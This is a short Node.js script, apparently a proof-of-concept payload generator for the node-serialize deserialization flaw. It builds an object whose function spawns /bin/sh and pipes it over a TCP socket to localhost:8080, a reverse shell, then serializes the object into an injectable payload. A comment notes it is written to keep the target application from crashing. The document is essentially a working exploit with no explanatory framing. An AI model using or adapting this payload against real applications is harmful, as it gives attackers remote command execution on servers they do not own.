var y = {
    name: function(){
        var net = require("net"),
            cp = require("child_process"),
            sh = cp.spawn("/bin/sh", []);
        var client = new net.Socket();
        client.connect(8080, "localhost", function(){
            client.pipe(sh.stdin);
            sh.stdout.pipe(client);
            sh.stderr.pipe(client);
        });
        return 'Mr Hacker'; // Prevents the Node.js application form crashing
    },
    from: 'Hidden location'
}

var serialize = require('node-serialize');
var yserial = serialize.serialize(y)
console.log("Serialized: \n" + yserial);
